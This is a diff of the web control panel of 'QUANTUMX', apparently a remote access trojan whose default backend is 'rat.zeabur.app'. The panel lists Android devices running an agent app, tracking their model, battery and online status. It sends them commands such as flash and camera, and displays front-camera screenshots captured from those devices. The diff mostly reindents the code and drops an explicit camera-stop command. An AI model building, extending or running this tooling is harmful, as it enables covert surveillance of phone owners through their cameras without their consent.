@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>QUANTUMX • Dashboard</title>
     
-    <!-- Fonts Icons -->
+    <!-- Fonts & Icons -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
@@ -1172,804 +1172,765 @@
             </button>
         </div>
     </div>
-    
     <script>
-        // ========== GLOBAL VARIABLES ==========
-        let socket = null;
-        let currentDevice = null;
-        let devices = [];
-        let backendUrl = localStorage.getItem('quantumx_server') || 'https://rat.zeabur.app';
-        let token = localStorage.getItem('quantumx_token');
+    // ========== GLOBAL VARIABLES ==========
+    let socket = null;
+    let currentDevice = null;
+    let devices = [];
+    let backendUrl = localStorage.getItem('quantumx_server') || 'https://rat.zeabur.app';
+    let token = localStorage.getItem('quantumx_token');
+    
+    // WebSocket devices storage
+    let wsDevices = new Map();
+    let deletedDevices = new Set();
+    
+    // COOLDOWN VARIABLES
+    let isCooldown = false;
+    let cooldownInterval = null;
+    let cooldownEndTime = 0;
+    
+    // Keep-alive interval
+    let keepAliveInterval = null;
+    
+    // ========== INIT ==========
+    (function() {
+        // Check auth
+        if (!token) {
+            window.location.href = 'login.html';
+            return;
+        }
         
-        // WebSocket devices storage
-        let wsDevices = new Map();
-        let deletedDevices = new Set();
+        // Set settings
+        document.getElementById('settings-backend-url').value = backendUrl;
         
-        // COOLDOWN VARIABLES
-        let isCooldown = false;
-        let cooldownInterval = null;
-        let cooldownEndTime = 0;
-        
-        // Keep-alive interval
-        let keepAliveInterval = null;
-        
-        // ========== INIT ==========
-        (function() {
-            // Check auth
-            if (!token) {
-                window.location.href = 'login.html';
-                return;
+        // Load deleted devices dari localStorage
+        try {
+            const saved = localStorage.getItem('quantumx_deleted_devices');
+            if (saved) {
+                deletedDevices = new Set(JSON.parse(saved));
             }
+        } catch (e) {}
+        
+        // Connect WebSocket
+        connectWebSocket();
+        
+        // Verify token
+        fetch(backendUrl + '/api/verify', {
+            method: 'POST',
+            headers: {
+                'Authorization': 'Bearer ' + token
+            }
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (!data.success) {
+                logout();
+            } else {
+                document.getElementById('username-display').textContent = data.user.username;
+                document.getElementById('settings-username').textContent = data.user.username;
+                loadDevices();
+            }
+        })
+        .catch(() => {
+            showNotification('Cannot connect to server', 'error');
+        });
+        
+        // Auto refresh stats
+        setInterval(updateStats, 3000);
+        
+        // Set flash section terbuka default
+        setTimeout(() => {
+            toggleSection('flash');
+        }, 500);
+    })();
+    
+    // ========== NOTIFICATION ==========
+    function showNotification(message, type = 'info') {
+        const notification = document.getElementById('notification');
+        const icon = document.getElementById('notification-icon');
+        const msgEl = document.getElementById('notification-message');
+        
+        notification.className = 'notification';
+        notification.classList.add('show');
+        notification.classList.add(type);
+        
+        if (type === 'success') {
+            icon.className = 'fas fa-check-circle';
+        } else if (type === 'error') {
+            icon.className = 'fas fa-exclamation-circle';
+        } else if (type === 'warning') {
+            icon.className = 'fas fa-exclamation-triangle';
+        } else {
+            icon.className = 'fas fa-info-circle';
+        }
+        
+        msgEl.textContent = message;
+        
+        setTimeout(() => {
+            hideNotification();
+        }, 3000);
+    }
+    
+    function hideNotification() {
+        document.getElementById('notification').classList.remove('show');
+    }
+    
+    // ========== COLLAPSIBLE SECTION ==========
+    function toggleSection(section) {
+        const content = document.getElementById(section + '-content');
+        const arrow = document.getElementById(section + '-arrow');
+        
+        content.classList.toggle('expanded');
+        arrow.classList.toggle('expanded');
+    }
+    
+    // ========== COOLDOWN FUNCTION ==========
+    function startCooldown(duration) {
+        if (isCooldown) return;
+        
+        isCooldown = true;
+        cooldownEndTime = Date.now() + (duration * 1000);
+        
+        const sendBtn = document.getElementById('send-flash-btn');
+        const btnText = document.getElementById('btn-text');
+        const cooldownTimer = document.getElementById('cooldown-timer');
+        const cooldownProgress = document.getElementById('cooldown-progress');
+        const durationInput = document.getElementById('flash-duration');
+        
+        // Disable button and input
+        sendBtn.disabled = true;
+        sendBtn.classList.add('cooldown');
+        durationInput.disabled = true;
+        
+        // Update cooldown setiap 100ms
+        cooldownInterval = setInterval(() => {
+            const now = Date.now();
+            const remaining = Math.max(0, cooldownEndTime - now);
+            const remainingSeconds = Math.ceil(remaining / 1000);
             
-            // Set settings
-            document.getElementById('settings-backend-url').value = backendUrl;
+            if (remaining <= 0) {
+                // Cooldown selesai
+                clearInterval(cooldownInterval);
+                isCooldown = false;
+                sendBtn.disabled = false;
+                sendBtn.classList.remove('cooldown');
+                durationInput.disabled = false;
+                btnText.textContent = 'Send Flash';
+                cooldownTimer.textContent = '';
+                cooldownProgress.style.width = '0%';
+            } else {
+                // Update tampilan
+                const progress = ((duration * 1000) - remaining) / (duration * 1000) * 100;
+                cooldownProgress.style.width = progress + '%';
+                btnText.textContent = 'Waiting';
+                cooldownTimer.textContent = `(${remainingSeconds}s)`;
+            }
+        }, 100);
+    }
+    
+    // ========== WEBSOCKET ==========
+    function connectWebSocket() {
+        try {
+            socket = io(backendUrl, {
+                transports: ['websocket', 'polling'],
+                reconnection: true,
+                reconnectionAttempts: 100,
+                reconnectionDelay: 1000,
+                reconnectionDelayMax: 5000,
+                timeout: 30000,
+                forceNew: true,
+                autoConnect: true
+            });
             
-            // Load deleted devices dari localStorage
-            try {
-                const saved = localStorage.getItem('quantumx_deleted_devices');
-                if (saved) {
-                    deletedDevices = new Set(JSON.parse(saved));
+            socket.on('connect', () => {
+                console.log('✅ WebSocket connected via:', socket.io.engine.transport.name);
+                updateConnectionStatus(true);
+                socket.emit('panel-connect', {});
+                showNotification('Connected to server', 'success');
+                
+                // Start keep-alive
+                startKeepAlive();
+            });
+            
+            socket.on('connect_error', (error) => {
+                console.error('WebSocket error:', error);
+                updateConnectionStatus(false);
+            });
+            
+            socket.on('disconnect', (reason) => {
+                console.log('WebSocket disconnected:', reason);
+                updateConnectionStatus(false);
+                stopKeepAlive();
+                
+                // Auto reconnect
+                if (reason === 'io server disconnect' || reason === 'transport close' || reason === 'ping timeout') {
+                    setTimeout(() => {
+                        socket.connect();
+                    }, 3000);
                 }
-            } catch (e) {}
+            });
             
-            // Connect WebSocket
-            connectWebSocket();
+            socket.on('device-status', (data) => {
+                console.log('📱 Device status:', data);
+                
+                const deviceId = data.deviceId;
+                const isOnline = data.status === 'online';
+                
+                // JIKA DEVICE ONLINE, HAPUS DARI DELETED DEVICES!
+                if (isOnline && deletedDevices.has(deviceId)) {
+                    console.log('🔄 Device online, removing from deleted list:', deviceId);
+                    deletedDevices.delete(deviceId);
+                    localStorage.setItem('quantumx_deleted_devices', JSON.stringify(Array.from(deletedDevices)));
+                }
+                
+                if (deletedDevices.has(deviceId)) {
+                    console.log('🚫 Device ignored (deleted):', deviceId);
+                    return;
+                }
+                
+                // AMBIL DATA LAMA KALO ADA
+                const existingDevice = wsDevices.get(deviceId);
+                
+                wsDevices.set(deviceId, {
+                    deviceId: deviceId,
+                    deviceName: existingDevice?.deviceName || data.deviceName || 'Unknown',
+                    model: existingDevice?.model || data.model || 'Unknown',
+                    androidVersion: existingDevice?.androidVersion || data.androidVersion || 'Unknown',
+                    batteryLevel: existingDevice?.batteryLevel || data.batteryLevel || 0,
+                    lastSeen: new Date().toISOString(),
+                    online: isOnline,
+                    fromWS: true
+                });
+                
+                mergeAndRenderDevices();
+                updateStats();
+            });
             
-            // Verify token
-            fetch(backendUrl + '/api/verify', {
-                method: 'POST',
+            socket.on('heartbeat', (data) => {
+                console.log('💓 Heartbeat:', data);
+                
+                const deviceId = data.deviceId;
+                
+                // JIKA ADA HEARTBEAT, HAPUS DARI DELETED DEVICES!
+                if (deletedDevices.has(deviceId)) {
+                    console.log('🔄 Heartbeat received, removing from deleted list:', deviceId);
+                    deletedDevices.delete(deviceId);
+                    localStorage.setItem('quantumx_deleted_devices', JSON.stringify(Array.from(deletedDevices)));
+                }
+                
+                const existingDevice = wsDevices.get(deviceId);
+                
+                wsDevices.set(deviceId, {
+                    deviceId: deviceId,
+                    deviceName: data.deviceName || existingDevice?.deviceName || 'Unknown',
+                    model: data.model || existingDevice?.model || 'Unknown',
+                    androidVersion: data.androidVersion || existingDevice?.androidVersion || 'Unknown',
+                    batteryLevel: data.batteryLevel || existingDevice?.batteryLevel || 0,
+                    lastSeen: new Date().toISOString(),
+                    online: true,
+                    fromWS: true
+                });
+                
+                mergeAndRenderDevices();
+                updateStats();
+            });
+            
+            // Handle camera frames
+            socket.on('camera-frame', (data) => {
+                console.log('📸 Camera frame received');
+                
+                if (currentDevice && data.deviceId === currentDevice.deviceId && data.imageData) {
+                    const cameraImage = document.getElementById('camera-image');
+                    const placeholder = document.getElementById('preview-placeholder');
+                    const status = document.getElementById('camera-status');
+                    const captureBtn = document.getElementById('capture-btn');
+                    
+                    cameraImage.src = 'data:image/jpeg;base64,' + data.imageData;
+                    cameraImage.style.display = 'block';
+                    placeholder.style.display = 'none';
+                    
+                    status.innerHTML = '<i class="fas fa-check-circle" style="color: var(--success);"></i> Screenshot berhasil: ' + new Date().toLocaleTimeString();
+                    status.className = 'camera-status success';
+                    
+                    captureBtn.disabled = false;
+                    captureBtn.innerHTML = '<i class="fas fa-camera-retro"></i> AMBIL';
+                    
+                    // TIDAK PERLU STOP CAMERA LAGI! (APK otomatis stop)
+                }
+            });
+            
+            // Handle command results
+            socket.on('command-result', (data) => {
+                console.log('Command result:', data);
+                
+                if (data.deviceId === currentDevice?.deviceId) {
+                    if (data.command === 'flash') {
+                        if (data.status === 'completed') {
+                            showNotification(`✅ Flash ${data.result?.duration || 2}s completed`, 'success');
+                        } else {
+                            showNotification(`❌ Flash failed`, 'error');
+                        }
+                    } else if (data.command === 'camera') {
+                        if (data.status === 'completed') {
+                            // Success, tunggu frame
+                            console.log('✅ Camera command success');
+                        } else {
+                            showNotification(`❌ Camera failed`, 'error');
+                            // Reset button jika gagal
+                            const captureBtn = document.getElementById('capture-btn');
+                            captureBtn.disabled = false;
+                            captureBtn.innerHTML = '<i class="fas fa-camera-retro"></i> AMBIL';
+                        }
+                    }
+                }
+            });
+            
+        } catch (e) {
+            console.error('WebSocket error:', e);
+            updateConnectionStatus(false);
+        }
+    }
+    
+    // ========== KEEP ALIVE ==========
+    function startKeepAlive() {
+        stopKeepAlive();
+        keepAliveInterval = setInterval(() => {
+            if (socket && socket.connected) {
+                socket.emit('ping');
+                console.log('🏓 Ping sent');
+            } else if (socket && !socket.connected) {
+                socket.connect();
+            }
+        }, 10000);
+    }
+    
+    function stopKeepAlive() {
+        if (keepAliveInterval) {
+            clearInterval(keepAliveInterval);
+            keepAliveInterval = null;
+        }
+    }
+    
+    function updateConnectionStatus(connected) {
+        const dot = document.getElementById('status-dot');
+        const text = document.getElementById('status-text');
+        const wsStatus = document.getElementById('settings-ws-status');
+        
+        if (connected) {
+            dot.className = 'status-dot connected';
+            text.textContent = 'Connected';
+            if (wsStatus) wsStatus.textContent = 'Connected';
+        } else {
+            dot.className = 'status-dot disconnected';
+            text.textContent = 'Disconnected';
+            if (wsStatus) wsStatus.textContent = 'Disconnected';
+        }
+    }
+    
+    // ========== DEVICE MANAGEMENT ==========
+    async function loadDevices() {
+        try {
+            const response = await fetch(backendUrl + '/api/devices', {
                 headers: {
                     'Authorization': 'Bearer ' + token
                 }
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (!data.success) {
+            });
+            
+            if (!response.ok) {
+                if (response.status === 401) {
                     logout();
-                } else {
-                    document.getElementById('username-display').textContent = data.user.username;
-                    document.getElementById('settings-username').textContent = data.user.username;
-                    loadDevices();
+                    return;
                 }
-            })
-            .catch(() => {
-                showNotification('Cannot connect to server', 'error');
-            });
-            
-            // Auto refresh stats
-            setInterval(updateStats, 3000);
-            
-            // Set flash section terbuka default
-            setTimeout(() => {
-                toggleSection('flash');
-            }, 500);
-        })();
-        
-        // ========== NOTIFICATION ==========
-        function showNotification(message, type = 'info') {
-            const notification = document.getElementById('notification');
-            const icon = document.getElementById('notification-icon');
-            const msgEl = document.getElementById('notification-message');
-            
-            notification.className = 'notification';
-            notification.classList.add('show');
-            notification.classList.add(type);
-            
-            if (type === 'success') {
-                icon.className = 'fas fa-check-circle';
-            } else if (type === 'error') {
-                icon.className = 'fas fa-exclamation-circle';
-            } else if (type === 'warning') {
-                icon.className = 'fas fa-exclamation-triangle';
-            } else {
-                icon.className = 'fas fa-info-circle';
+                throw new Error('Failed to load devices');
             }
             
-            msgEl.textContent = message;
+            const data = await response.json();
+            devices = data.filter(d => !deletedDevices.has(d.deviceId));
             
-            setTimeout(() => {
-                hideNotification();
-            }, 3000);
+        } catch (error) {
+            console.error('Devices error:', error);
+            devices = [];
         }
         
-        function hideNotification() {
-            document.getElementById('notification').classList.remove('show');
-        }
+        mergeAndRenderDevices();
+    }
+    
+    function mergeAndRenderDevices() {
+        let allDevices = [];
         
-        // ========== COLLAPSIBLE SECTION ==========
-        function toggleSection(section) {
-            const content = document.getElementById(section + '-content');
-            const arrow = document.getElementById(section + '-arrow');
-            
-            content.classList.toggle('expanded');
-            arrow.classList.toggle('expanded');
-        }
-        
-        // ========== COOLDOWN FUNCTION ==========
-        function startCooldown(duration) {
-            if (isCooldown) return;
-            
-            isCooldown = true;
-            cooldownEndTime = Date.now() + (duration * 1000);
-            
-            const sendBtn = document.getElementById('send-flash-btn');
-            const btnText = document.getElementById('btn-text');
-            const cooldownTimer = document.getElementById('cooldown-timer');
-            const cooldownProgress = document.getElementById('cooldown-progress');
-            const durationInput = document.getElementById('flash-duration');
-            
-            // Disable button and input
-            sendBtn.disabled = true;
-            sendBtn.classList.add('cooldown');
-            durationInput.disabled = true;
-            
-            // Update cooldown setiap 100ms
-            cooldownInterval = setInterval(() => {
-                const now = Date.now();
-                const remaining = Math.max(0, cooldownEndTime - now);
-                const remainingSeconds = Math.ceil(remaining / 1000);
-                
-                if (remaining <= 0) {
-                    // Cooldown selesai
-                    clearInterval(cooldownInterval);
-                    isCooldown = false;
-                    sendBtn.disabled = false;
-                    sendBtn.classList.remove('cooldown');
-                    durationInput.disabled = false;
-                    btnText.textContent = 'Send Flash';
-                    cooldownTimer.textContent = '';
-                    cooldownProgress.style.width = '0%';
-                } else {
-                    // Update tampilan
-                    const progress = ((duration * 1000) - remaining) / (duration * 1000) * 100;
-                    cooldownProgress.style.width = progress + '%';
-                    btnText.textContent = 'Waiting';
-                    cooldownTimer.textContent = `(${remainingSeconds}s)`;
-                }
-            }, 100);
-        }
-        
-        // ========== WEBSOCKET ==========
-        function connectWebSocket() {
-            try {
-                socket = io(backendUrl, {
-                    transports: ['websocket', 'polling'],
-                    reconnection: true,
-                    reconnectionAttempts: 100,
-                    reconnectionDelay: 1000,
-                    reconnectionDelayMax: 5000,
-                    timeout: 30000,
-                    forceNew: true,
-                    autoConnect: true
-                });
-                
-                socket.on('connect', () => {
-                    console.log('✅ WebSocket connected via:', socket.io.engine.transport.name);
-                    updateConnectionStatus(true);
-                    socket.emit('panel-connect', {});
-                    showNotification('Connected to server', 'success');
-                    
-                    // Start keep-alive
-                    startKeepAlive();
-                });
-                
-                socket.on('connect_error', (error) => {
-                    console.error('WebSocket error:', error);
-                    updateConnectionStatus(false);
-                });
-                
-                socket.on('disconnect', (reason) => {
-                    console.log('WebSocket disconnected:', reason);
-                    updateConnectionStatus(false);
-                    stopKeepAlive();
-                    
-                    // Auto reconnect
-                    if (reason === 'io server disconnect' || reason === 'transport close' || reason === 'ping timeout') {
-                        setTimeout(() => {
-                            socket.connect();
-                        }, 3000);
-                    }
-                });
-                
-                socket.on('device-status', (data) => {
-                    console.log('📱 Device status:', data);
-                    
-                    const deviceId = data.deviceId;
-                    const isOnline = data.status === 'online';
-                    
-                    // JIKA DEVICE ONLINE, HAPUS DARI DELETED DEVICES!
-                    if (isOnline && deletedDevices.has(deviceId)) {
-                        console.log('🔄 Device online, removing from deleted list:', deviceId);
-                        deletedDevices.delete(deviceId);
-                        localStorage.setItem('quantumx_deleted_devices', JSON.stringify(Array.from(deletedDevices)));
-                    }
-                    
-                    if (deletedDevices.has(deviceId)) {
-                        console.log('🚫 Device ignored (deleted):', deviceId);
-                        return;
-                    }
-                    
-                    // AMBIL DATA LAMA KALO ADA
-                    const existingDevice = wsDevices.get(deviceId);
-                    
-                    wsDevices.set(deviceId, {
-                        deviceId: deviceId,
-                        deviceName: existingDevice?.deviceName || data.deviceName || 'Unknown',
-                        model: existingDevice?.model || data.model || 'Unknown',
-                        androidVersion: existingDevice?.androidVersion || data.androidVersion || 'Unknown',
-                        batteryLevel: existingDevice?.batteryLevel || data.batteryLevel || 0,
-                        lastSeen: new Date().toISOString(),
-                        online: isOnline,
-                        fromWS: true
-                    });
-                    
-                    mergeAndRenderDevices();
-                    updateStats();
-                });
-                
-                socket.on('heartbeat', (data) => {
-                    console.log('💓 Heartbeat:', data);
-                    
-                    const deviceId = data.deviceId;
-                    
-                    // JIKA ADA HEARTBEAT, HAPUS DARI DELETED DEVICES!
-                    if (deletedDevices.has(deviceId)) {
-                        console.log('🔄 Heartbeat received, removing from deleted list:', deviceId);
-                        deletedDevices.delete(deviceId);
-                        localStorage.setItem('quantumx_deleted_devices', JSON.stringify(Array.from(deletedDevices)));
-                    }
-                    
-                    const existingDevice = wsDevices.get(deviceId);
-                    
-                    wsDevices.set(deviceId, {
-                        deviceId: deviceId,
-                        deviceName: data.deviceName || existingDevice?.deviceName || 'Unknown',
-                        model: data.model || existingDevice?.model || 'Unknown',
-                        androidVersion: data.androidVersion || existingDevice?.androidVersion || 'Unknown',
-                        batteryLevel: data.batteryLevel || existingDevice?.batteryLevel || 0,
-                        lastSeen: new Date().toISOString(),
-                        online: true,
-                        fromWS: true
-                    });
-                    
-                    mergeAndRenderDevices();
-                    updateStats();
-                });
-                
-                // Handle camera frames
-                socket.on('camera-frame', (data) => {
-                    console.log('📸 Camera frame received');
-                    
-                    if (currentDevice && data.deviceId === currentDevice.deviceId && data.imageData) {
-                        const cameraImage = document.getElementById('camera-image');
-                        const placeholder = document.getElementById('preview-placeholder');
-                        const status = document.getElementById('camera-status');
-                        const captureBtn = document.getElementById('capture-btn');
-                        
-                        cameraImage.src = 'data:image/jpeg;base64,' + data.imageData;
-                        cameraImage.style.display = 'block';
-                        placeholder.style.display = 'none';
-                        
-                        status.innerHTML = '<i class="fas fa-check-circle" style="color: var(--success);"></i> Screenshot berhasil: ' + new Date().toLocaleTimeString();
-                        status.className = 'camera-status success';
-                        
-                        captureBtn.disabled = false;
-                        captureBtn.innerHTML = '<i class="fas fa-camera-retro"></i> AMBIL';
-                        
-                        // Stop camera setelah screenshot
-                        fetch(backendUrl + '/api/device/' + currentDevice.deviceId + '/command', {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                                'Authorization': 'Bearer ' + token
-                            },
-                            body: JSON.stringify({ command: 'camera_stop' })
-                        }).catch(err => console.log('Stop camera error:', err));
-                    }
-                });
-                
-                // Handle command results
-                socket.on('command-result', (data) => {
-                    console.log('Command result:', data);
-                    
-                    if (data.deviceId === currentDevice?.deviceId) {
-                        if (data.command === 'flash') {
-                            if (data.status === 'completed') {
-                                showNotification(`✅ Flash ${data.result?.duration || 2}s completed`, 'success');
-                            } else {
-                                showNotification(`❌ Flash failed`, 'error');
-                            }
-                        }
-                    }
-                });
-                
-            } catch (e) {
-                console.error('WebSocket error:', e);
-                updateConnectionStatus(false);
+        // Prioritas: data dari WebSocket (lebih realtime)
+        wsDevices.forEach((wsDevice, id) => {
+            if (!deletedDevices.has(id)) {
+                allDevices.push(wsDevice);
             }
-        }
+        });
         
-        // ========== KEEP ALIVE ==========
-        function startKeepAlive() {
-            stopKeepAlive();
-            keepAliveInterval = setInterval(() => {
-                if (socket && socket.connected) {
-                    socket.emit('ping');
-                    console.log('🏓 Ping sent');
-                } else if (socket && !socket.connected) {
-                    socket.connect();
-                }
-            }, 10000);
-        }
-        
-        function stopKeepAlive() {
-            if (keepAliveInterval) {
-                clearInterval(keepAliveInterval);
-                keepAliveInterval = null;
+        // Tambah dari API yang belum ada di WebSocket
+        devices.forEach(d => {
+            if (!deletedDevices.has(d.deviceId) && !allDevices.find(dev => dev.deviceId === d.deviceId)) {
+                allDevices.push(d);
             }
-        }
+        });
         
-        function updateConnectionStatus(connected) {
-            const dot = document.getElementById('status-dot');
-            const text = document.getElementById('status-text');
-            const wsStatus = document.getElementById('settings-ws-status');
-            
-            if (connected) {
-                dot.className = 'status-dot connected';
-                text.textContent = 'Connected';
-                if (wsStatus) wsStatus.textContent = 'Connected';
-            } else {
-                dot.className = 'status-dot disconnected';
-                text.textContent = 'Disconnected';
-                if (wsStatus) wsStatus.textContent = 'Disconnected';
-            }
+        if (allDevices.length === 0) {
+            document.getElementById('no-devices').style.display = 'block';
+            document.getElementById('devices-grid').style.display = 'none';
+            document.getElementById('devices-loading').style.display = 'none';
+        } else {
+            document.getElementById('no-devices').style.display = 'none';
+            document.getElementById('devices-grid').style.display = 'grid';
+            document.getElementById('devices-loading').style.display = 'none';
+            renderDevices(allDevices);
         }
+    }
+    
+    function renderDevices(devicesList) {
+        const grid = document.getElementById('devices-grid');
+        grid.innerHTML = '';
         
-        // ========== DEVICE MANAGEMENT ==========
-        async function loadDevices() {
-            try {
-                const response = await fetch(backendUrl + '/api/devices', {
-                    headers: {
-                        'Authorization': 'Bearer ' + token
-                    }
-                });
-                
-                if (!response.ok) {
-                    if (response.status === 401) {
-                        logout();
-                        return;
-                    }
-                    throw new Error('Failed to load devices');
-                }
-                
-                const data = await response.json();
-                devices = data.filter(d => !deletedDevices.has(d.deviceId));
-                
-            } catch (error) {
-                console.error('Devices error:', error);
-                devices = [];
-            }
-            
-            mergeAndRenderDevices();
-        }
-        
-        function mergeAndRenderDevices() {
-            let allDevices = [];
-            
-            // Prioritas: data dari WebSocket (lebih realtime)
-            wsDevices.forEach((wsDevice, id) => {
-                if (!deletedDevices.has(id)) {
-                    allDevices.push(wsDevice);
-                }
-            });
-            
-            // Tambah dari API yang belum ada di WebSocket
-            devices.forEach(d => {
-                if (!deletedDevices.has(d.deviceId) && !allDevices.find(dev => dev.deviceId === d.deviceId)) {
-                    allDevices.push(d);
-                }
-            });
-            
-            if (allDevices.length === 0) {
-                document.getElementById('no-devices').style.display = 'block';
-                document.getElementById('devices-grid').style.display = 'none';
-                document.getElementById('devices-loading').style.display = 'none';
-            } else {
-                document.getElementById('no-devices').style.display = 'none';
-                document.getElementById('devices-grid').style.display = 'grid';
-                document.getElementById('devices-loading').style.display = 'none';
-                renderDevices(allDevices);
-            }
-        }
-        
-        function renderDevices(devicesList) {
-            const grid = document.getElementById('devices-grid');
-            grid.innerHTML = '';
-            
-            devicesList.forEach(device => {
-                const lastSeen = new Date(device.lastSeen || Date.now());
-                const now = new Date();
-                const diffMinutes = (now - lastSeen) / (1000 * 60);
-                const isOnline = device.online && diffMinutes < 5;
-                
-                const card = document.createElement('div');
-                card.className = `device-card ${isOnline ? 'online' : 'offline'}`;
-                card.onclick = () => openDeviceModal(device);
-                
-                card.innerHTML = `
-                    <div class="device-header">
-                        <div class="device-icon">
-                            <i class="fas fa-mobile-alt"></i>
-                        </div>
-                        <div>
-                            <div class="device-name">${device.deviceName || device.deviceId}</div>
-                            <div class="device-model">${device.model || 'Android Device'}</div>
-                        </div>
-                    </div>
-                    <div class="device-details">
-                        <div class="detail-item">
-                            Android
-                            <strong>${device.androidVersion || 'Unknown'}</strong>
-                        </div>
-                        <div class="detail-item">
-                            Battery
-                            <strong>${device.batteryLevel || '?'}%</strong>
-                        </div>
-                        <div class="detail-item">
-                            Status
-                            <strong>${isOnline ? 'Online' : 'Offline'}</strong>
-                        </div>
-                        <div class="detail-item">
-                            Last Seen
-                            <strong>${new Date(device.lastSeen).toLocaleTimeString()}</strong>
-                        </div>
-                    </div>
-                    <div class="device-footer">
-                        <div>
-                            <span class="status-badge ${isOnline ? 'online' : 'offline'}"></span>
-                            ${isOnline ? 'Online' : 'Offline'}
-                        </div>
-                        <div>
-                            ID: ${device.deviceId.substr(0, 8)}...
-                        </div>
-                    </div>
-                `;
-                
-                grid.appendChild(card);
-            });
-        }
-        
-        function filterDevices() {
-            const search = document.getElementById('search-input').value.toLowerCase();
-            
-            let allDevices = [];
-            wsDevices.forEach((d, id) => {
-                if (!deletedDevices.has(id)) allDevices.push(d);
-            });
-            devices.forEach(d => {
-                if (!deletedDevices.has(d.deviceId) && !allDevices.find(dev => dev.deviceId === d.deviceId)) {
-                    allDevices.push(d);
-                }
-            });
-            
-            const filtered = allDevices.filter(d => 
-                (d.deviceName || '').toLowerCase().includes(search) ||
-                (d.model || '').toLowerCase().includes(search) ||
-                (d.deviceId || '').toLowerCase().includes(search)
-            );
-            renderDevices(filtered);
-        }
-        
-        // ========== STATS ==========
-        function updateStats() {
-            let allDevices = [];
-            wsDevices.forEach((d, id) => {
-                if (!deletedDevices.has(id)) allDevices.push(d);
-            });
-            devices.forEach(d => {
-                if (!deletedDevices.has(d.deviceId) && !allDevices.find(dev => dev.deviceId === d.deviceId)) {
-                    allDevices.push(d);
-                }
-            });
-            
-            const total = allDevices.length;
-            const online = allDevices.filter(d => {
-                const lastSeen = new Date(d.lastSeen || Date.now());
-                const now = new Date();
-                const diffMinutes = (now - lastSeen) / (1000 * 60);
-                return d.online && diffMinutes < 5;
-            }).length;
-            
-            document.getElementById('total-devices').textContent = total;
-            document.getElementById('online-devices').textContent = online;
-        }
-        
-        // ========== MODAL ==========
-        function openDeviceModal(device) {
-            currentDevice = device;
-            
-            document.getElementById('modal-device-name').textContent = device.deviceName || device.deviceId;
-            document.getElementById('info-deviceid').textContent = device.deviceId;
-            document.getElementById('info-model').textContent = `${device.model || 'Unknown'}`;
-            document.getElementById('info-android').textContent = device.androidVersion || 'Unknown';
-            document.getElementById('info-battery').textContent = device.batteryLevel ? device.batteryLevel + '%' : 'Unknown';
-            document.getElementById('info-lastseen').textContent = new Date(device.lastSeen).toLocaleString();
-            
+        devicesList.forEach(device => {
             const lastSeen = new Date(device.lastSeen || Date.now());
             const now = new Date();
             const diffMinutes = (now - lastSeen) / (1000 * 60);
             const isOnline = device.online && diffMinutes < 5;
-            document.getElementById('info-status').textContent = isOnline ? 'Online' : 'Offline';
             
-            // Reset camera preview
-            resetCameraPreview();
+            const card = document.createElement('div');
+            card.className = `device-card ${isOnline ? 'online' : 'offline'}`;
+            card.onclick = () => openDeviceModal(device);
             
-            document.getElementById('flash-duration').value = 2;
-            document.getElementById('flash-duration').disabled = false;
-            document.getElementById('device-modal').classList.add('active');
+            card.innerHTML = `
+                <div class="device-header">
+                    <div class="device-icon">
+                        <i class="fas fa-mobile-alt"></i>
+                    </div>
+                    <div>
+                        <div class="device-name">${device.deviceName || device.deviceId}</div>
+                        <div class="device-model">${device.model || 'Android Device'}</div>
+                    </div>
+                </div>
+                <div class="device-details">
+                    <div class="detail-item">
+                        Android
+                        <strong>${device.androidVersion || 'Unknown'}</strong>
+                    </div>
+                    <div class="detail-item">
+                        Battery
+                        <strong>${device.batteryLevel || '?'}%</strong>
+                    </div>
+                    <div class="detail-item">
+                        Status
+                        <strong>${isOnline ? 'Online' : 'Offline'}</strong>
+                    </div>
+                    <div class="detail-item">
+                        Last Seen
+                        <strong>${new Date(device.lastSeen).toLocaleTimeString()}</strong>
+                    </div>
+                </div>
+                <div class="device-footer">
+                    <div>
+                        <span class="status-badge ${isOnline ? 'online' : 'offline'}"></span>
+                        ${isOnline ? 'Online' : 'Offline'}
+                    </div>
+                    <div>
+                        ID: ${device.deviceId.substr(0, 8)}...
+                    </div>
+                </div>
+            `;
             
-            // Tutup semua section saat buka modal
-            document.getElementById('flash-content').classList.remove('expanded');
-            document.getElementById('flash-arrow').classList.remove('expanded');
-            document.getElementById('camera-content').classList.remove('expanded');
-            document.getElementById('camera-arrow').classList.remove('expanded');
-        }
+            grid.appendChild(card);
+        });
+    }
+    
+    function filterDevices() {
+        const search = document.getElementById('search-input').value.toLowerCase();
         
-        function closeModal() {
-            document.getElementById('device-modal').classList.remove('active');
-            currentDevice = null;
-        }
+        let allDevices = [];
+        wsDevices.forEach((d, id) => {
+            if (!deletedDevices.has(id)) allDevices.push(d);
+        });
+        devices.forEach(d => {
+            if (!deletedDevices.has(d.deviceId) && !allDevices.find(dev => dev.deviceId === d.deviceId)) {
+                allDevices.push(d);
+            }
+        });
         
-        // ========== CAMERA FUNCTIONS ==========
-        function resetCameraPreview() {
-            const cameraImage = document.getElementById('camera-image');
-            const placeholder = document.getElementById('preview-placeholder');
-            const status = document.getElementById('camera-status');
-            
-            cameraImage.style.display = 'none';
-            cameraImage.src = '';
-            placeholder.style.display = 'block';
-            status.innerHTML = '<i class="fas fa-info-circle"></i> Klik AMBIL untuk mengambil screenshot kamera depan';
-            status.className = 'camera-status';
-        }
+        const filtered = allDevices.filter(d => 
+            (d.deviceName || '').toLowerCase().includes(search) ||
+            (d.model || '').toLowerCase().includes(search) ||
+            (d.deviceId || '').toLowerCase().includes(search)
+        );
+        renderDevices(filtered);
+    }
+    
+    // ========== STATS ==========
+    function updateStats() {
+        let allDevices = [];
+        wsDevices.forEach((d, id) => {
+            if (!deletedDevices.has(id)) allDevices.push(d);
+        });
+        devices.forEach(d => {
+            if (!deletedDevices.has(d.deviceId) && !allDevices.find(dev => dev.deviceId === d.deviceId)) {
+                allDevices.push(d);
+            }
+        });
         
-        async function captureScreenshot() {
-            if (!currentDevice) {
-                showNotification('No device selected', 'error');
-                return;
-            }
-            
-            const captureBtn = document.getElementById('capture-btn');
-            captureBtn.disabled = true;
